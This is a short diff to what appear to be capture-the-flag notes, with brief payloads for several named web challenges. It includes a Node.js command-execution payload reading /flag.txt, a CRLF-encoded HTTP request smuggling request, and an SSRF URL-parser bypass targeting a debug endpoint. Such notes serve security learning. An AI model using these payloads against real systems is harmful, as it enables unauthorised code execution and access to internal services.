@@ -99,7 +99,7 @@ Content-Disposition: form-data; name="amount"
 
         -----------------------------388085167429586914953899034002--
 
-2 conditions for 1 parameter "amount"at the same time 
+2 conditions for 1 parameter "amount" at the same time 
 
 jscacl:
     require('child_process').execSync('cat /flag.txt').toString()
@@ -119,5 +119,9 @@ ApacheBlaze:
 Http request smuggling 
 GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1
 Host: <Ip of the machine>
-...[other headers]...
-Connection: close
+
+Insomnia:
+
+ProxyAsService:
+Weak parser bypass
+GET /?url=google.com@0:1337/debug/environment
